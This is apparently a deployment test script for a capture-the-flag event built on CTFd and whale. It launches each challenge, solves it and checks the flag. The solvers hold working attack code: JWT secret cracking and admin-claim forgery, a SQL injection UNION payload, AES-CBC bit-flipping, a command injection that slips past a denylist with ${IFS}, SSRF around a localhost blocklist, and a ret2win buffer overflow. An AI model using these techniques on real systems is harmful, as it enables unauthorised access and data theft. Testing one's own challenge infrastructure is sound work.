#!/usr/bin/env python3
"""Check the whole path of a deployable challenge on the production stack.

For every challenge in catalog.DEPLOYABLE this launches an instance for a
temporary test team through whale (swarm service + frp route), opens it through
Caddy exactly as a player's browser would, solves it, and checks that the flag
it serves is the one whale will accept. Then it stops the instance and deletes
the test team.

It does not touch rounds, so it is safe to run before or during the event.
It needs docker-compose.production.yml (it reaches instances via Caddy).
"""

import base64
import hashlib
import hmac
import importlib
import json
import os
import re
import socket
import struct
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

sys.path.insert(0, "/opt/CTFd")

from CTFd import create_app
from CTFd.models import Challenges, Teams, Users, db
from CTFd.utils import get_config

TESTER = "whaletester"
# Caddy's address inside the compose network. Instances are selected by Host.
PROXY = os.environ.get("WHALE_TEST_PROXY", "http://caddy")
# frps serves "direct" (raw TCP) challenges on the port whale assigns. It is on
# the same compose network as CTFd, so we reach it by name.
FRPS_HOST = os.environ.get("WHALE_TEST_FRPS", "frps")
START_TIMEOUT = 60


def http_get(host, path="/", headers=None):
    req = urllib.request.Request(PROXY + path, headers={"Host": host, **(headers or {})})
    with urllib.request.urlopen(req, timeout=10) as resp:
        return resp.read().decode()


def wait_until_up(host):
    started = time.time()
    while True:
        try:
            http_get(host)
            return time.time() - started
        except (urllib.error.URLError, ConnectionError) as exc:
            if time.time() - started > START_TIMEOUT:
                raise AssertionError(f"{host} not reachable after {START_TIMEOUT}s: {exc}")
            time.sleep(0.5)


def solve_01(host):
    parts = {}
    for path in ("/", "/style.css", "/script.js"):
        for n, text in re.findall(r"Part (\d)/3 of the flag: (\S+)", http_get(host, path)):
            parts[n] = text
    return "".join(parts[n] for n in sorted(parts))


def solve_20(host):
    b64d = lambda s: base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))
    b64e = lambda b: base64.urlsafe_b64encode(b).rstrip(b"=").decode()
    sign = lambda key, msg: b64e(hmac.new(key.encode(), msg.encode(), hashlib.sha256).digest())

    token = re.search(r"eyJ[\w-]+\.[\w-]+\.[\w-]+", http_get(host)).group(0)
    header, payload, signature = token.split(".")
    words = http_get(host, "/backup/wordlist.txt").split()
    secret = next(w for w in words if sign(w, f"{header}.{payload}") == signature)
    claims = json.loads(b64d(payload))
    claims["role"] = "admin"
    forged_payload = b64e(json.dumps(claims).encode())
    forged = f"{header}.{forged_payload}.{sign(secret, f'{header}.{forged_payload}')}"
    vault = http_get(host, "/vault", {"Authorization": f"Bearer {forged}"})
    return re.search(r"TAIBAH\{[^}]*\}", vault).group(0)


def solve_21(host):
    # SQL injection: UNION-select the flag out of the private secrets table.
    q = "' UNION SELECT label, secret FROM secrets-- -"
    page = http_get(host, "/?q=" + urllib.parse.quote(q))
    return re.search(r"TAIBAH\{[^}]*\}", page).group(0)


def solve_22(host):
    # AES-CBC bit-flip: flip IV bytes so block 0 decodes role=guest -> role=admin.
    page = http_get(host, "/")
    token = re.search(r'<pre id="scroll">([^<]+)</pre>', page).group(1).strip()
    raw = base64.urlsafe_b64decode(token + "=" * (-len(token) % 4))
    iv, ct = bytearray(raw[:16]), raw[16:]
    for i, (g, a) in enumerate(zip(b"guest", b"admin")):
        iv[5 + i] ^= g ^ a
    forged = base64.urlsafe_b64encode(bytes(iv) + ct).rstrip(b"=").decode()
    vault = http_get(host, "/vault?token=" + urllib.parse.quote(forged))
    return re.search(r"TAIBAH\{[^}]*\}", vault).group(0)


def solve_23(host):
    # Command injection past a whitespace/;/& denylist, via a pipe and ${IFS}.
    payload = "127.0.0.1|cat${IFS}/flag.txt"
    page = http_get(host, "/?host=" + urllib.parse.quote(payload))
    return re.search(r"TAIBAH\{[^}]*\}", page).group(0)


def solve_24(host):
    # SSRF to the loopback-only admin service, dodging the localhost blocklist.
    page = http_get(host, "/?url=" + urllib.parse.quote("http://0.0.0.0:8081/flag"))
    return re.search(r"TAIBAH\{[^}]*\}", page).group(0)


def _elf_symbol(elf, name):
    """Absolute address of a symbol in a non-PIE ELF64, without external tools."""
    u = lambda off, size: int.from_bytes(elf[off:off + size], "little")
    shoff, shentsize, shnum = u(0x28, 8), u(0x3A, 2), u(0x3C, 2)
    sections = []
    for i in range(shnum):
        b = shoff + i * shentsize
        # (sh_type, sh_offset, sh_size, sh_link, sh_entsize)
        sections.append((u(b + 4, 4), u(b + 24, 8), u(b + 32, 8), u(b + 40, 4), u(b + 56, 8)))
    _, sym_off, sym_size, link, entsize = next(s for s in sections if s[0] == 2)  # SHT_SYMTAB
    str_off = sections[link][1]
    entsize = entsize or 24
    for off in range(sym_off, sym_off + sym_size, entsize):
        st_name, st_value = u(off, 4), u(off + 8, 8)
        end = elf.index(b"\x00", str_off + st_name)
        if elf[str_off + st_name:end] == name:
            return st_value
    raise ValueError(f"symbol {name!r} not found")


def solve_25(sock):
    # ret2win: the service dumps its own binary (base64) before the vulnerable
    # read, so parse it for win()'s address and overflow the 64-byte buffer.
    banner = _recv_until(sock, b"override code:")
    b64 = re.search(rb"BEGIN floodgate \(base64\) ---\s*(.*?)\s*--- END", banner, re.S).group(1)
    win = _elf_symbol(base64.b64decode(b64), b"win")
    sock.sendall(b"A" * 72 + struct.pack("<Q", win))
    out = banner + _recv_rest(sock)
    return re.search(rb"TAIBAH\{[^}]*\}", out).group(0).decode()


SOLVERS = {
    "01-inspect-the-oasis": solve_01,
    "20-token-of-trust": solve_20,
    "21-caravan-ledger": solve_21,
    "22-sealed-scroll": solve_22,
    "23-desert-diagnostics": solve_23,
    "24-mirage-preview": solve_24,
    "25-floodgate-override": solve_25,
}


def wait_tcp(host, port):
    started = time.time()
    while True:
        try:
            return socket.create_connection((host, port), timeout=5), time.time() - started
        except OSError as exc:
            if time.time() - started > START_TIMEOUT:
                raise AssertionError(f"{host}:{port} not reachable after {START_TIMEOUT}s: {exc}")
            time.sleep(0.5)


def _recv_until(sock, marker, timeout=10):
    sock.settimeout(timeout)
    buf = b""
    while marker not in buf:
        chunk = sock.recv(4096)
        if not chunk:
            break
        buf += chunk
    return buf


def _recv_rest(sock, timeout=5):
    sock.settimeout(timeout)
    buf = b""
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            buf += chunk
    except (socket.timeout, TimeoutError):
        pass
    return buf


def cleanup(control):
    user = Users.query.filter_by(name=TESTER).first()
    if user is None:
        return
    control.ControlUtil.try_remove_container(user.id)
    team_id = user.team_id
    user.team_id = None
    if team_id:
        Teams.query.filter_by(id=team_id).update({Teams.captain_id: None})
    db.session.flush()
    if team_id:
        Teams.query.filter_by(id=team_id).delete()
    db.session.delete(user)
    db.session.commit()


def main():
    app = create_app()
    with app.app_context():
        catalog = importlib.import_module("CTFd.plugins.ctfd-rounds.catalog")
        checks = importlib.import_module("CTFd.plugins.ctfd-whale.utils.checks")
        control = importlib.import_module("CTFd.plugins.ctfd-whale.utils.control")
        whale_db = importlib.import_module("CTFd.plugins.ctfd-whale.utils.db")

        errors = checks.WhaleChecks.perform()
        assert not errors, f"whale settings: {errors}"
        suffix = get_config("whale:frp_http_domain_suffix")
        names = {c["slug"]: c["name"] for c in catalog.CHALLENGES}

        cleanup(control)
        user = Users(name=TESTER, email=f"{TESTER}@example.com", password=os.urandom(16).hex())
        db.session.add(user)
        db.session.flush()
        team = Teams(name=TESTER, email=f"{TESTER}-team@example.com", password=os.urandom(16).hex(),
                     captain_id=user.id, hidden=True)
        db.session.add(team)
        db.session.flush()
        user.team_id = team.id
        db.session.commit()

        failed = False
        try:
            for slug, deploy in catalog.DEPLOYABLE.items():
                challenge = Challenges.query.filter_by(name=names[slug]).one()
                ok, message = control.ControlUtil.try_add_container(user.id, challenge.id)
                assert ok, f"{slug}: launch failed: {message} (see `docker compose logs ctfd`)"
                container = whale_db.DBContainer.get_current_containers(user.id)
                solver = SOLVERS.get(slug)
                try:
                    if deploy["redirect_type"] == "direct":
                        where = f"{FRPS_HOST}:{container.port}"
                        sock, took = wait_tcp(FRPS_HOST, container.port)
                        try:
                            flag = solver(sock) if solver else None
                        finally:
                            sock.close()
                    else:
                        host = f"{container.http_subdomain}.{suffix}"
                        where = f"http://{host}/"
                        took = wait_until_up(host)
                        flag = solver(host) if solver else None
                    if solver is None:
                        print(f"PASS {slug}: reachable at {where} after {took:.1f}s (no solver)")
                    elif flag == container.flag:
                        print(f"PASS {slug}: solved via {where} after {took:.1f}s")
                    else:
                        failed = True
                        print(f"FAIL {slug}: served {flag!r}, whale expects {container.flag!r}")
                finally:
                    ok, message = control.ControlUtil.try_remove_container(user.id)
                    assert ok, f"{slug}: stop failed: {message}"
        finally:
            cleanup(control)
        if failed:
            sys.exit(1)
        print("PASS all deployable challenges launch, route, solve, and stop")


if __name__ == "__main__":
    main()
